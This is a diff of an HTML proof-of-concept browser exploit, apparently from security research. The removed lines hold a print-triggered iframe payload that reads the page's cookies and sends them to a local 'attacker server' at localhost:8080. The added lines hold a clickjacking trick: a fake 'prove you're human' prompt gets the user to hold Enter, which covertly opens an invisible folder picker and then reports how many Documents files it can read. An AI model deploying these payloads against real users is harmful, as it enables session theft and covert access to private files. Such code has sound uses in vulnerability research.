@@ -1,59 +1,36 @@
-<!DOCTYPE html>
 <html>
 <head>
-<style>
-iframe { width:300px; height:300px; }
-</style>
+
 </head>
 <body>
-
-<textarea id="qd">
-<!DOCTYPE html>
-<html __IE_DisplayURL="https://www.bing.com/">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-<base href="https://www.bing.com/">
 <style>
-html { font-family: "Times New Roman"; }
-iframe { width:300px; height:300px; }
+#q{
+opacity:0.0;
+}
 </style>
-</head>
-<body>
 
-<iframe id="qif" src="javascript:
-  var qa = top.document.createElement('img');
-  qa.src = 'http://localhost:8080/?' + encodeURIComponent(btoa(top.document.cookie));
-  top.document.body.appendChild(qa);
-  'just sent the following data to attacker server:<br>' + top.document.cookie;
-"></iframe>
-
-</body>
-</html>
-</textarea>
-
+<b>Hold down enter for 5 seconds to prove you're human</b>
+<input type=file id=q webkitdirectory='true'><br>
+<textarea id="qtxt" style="height:300px;">Things grabbed:</textarea>
 <script>
-var qdiv = document.createElement('div');
-document.body.appendChild(qdiv);
-
-window.onbeforeprint = function () {
-  qdiv.innerHTML = `
-    <iframe src="javascript:
-      if (top.location.protocol == 'file:') {
-        setTimeout(function () {
-          top.location = URL.createObjectURL(
-            new Blob(
-              [top.document.getElementById('qd').value],
-              { type: 'text/html' }
-            )
-          );
-        }, 1000);
-      }
-    "></iframe>
-  `;
+var i=25;
+document.onkeypress=function(e){if(q.value.length>0){qtxt.value+=(q.value+'\n');}
+	if(q.value=='Documents'){
+		window.i=1000;
+		}
+	if(e.key==='Enter'){
+		window.i--;
+		if(window.i<3){
+			q.click();
+		}
+	}
 };
 
-window.print();
+q.onchange=function(){
+if(window.i>10){
+	document.body.innerHTML=('I can read '+q.files.length+' files from Documents folder');
+	}
+}
 </script>
-
 </body>
 </html>
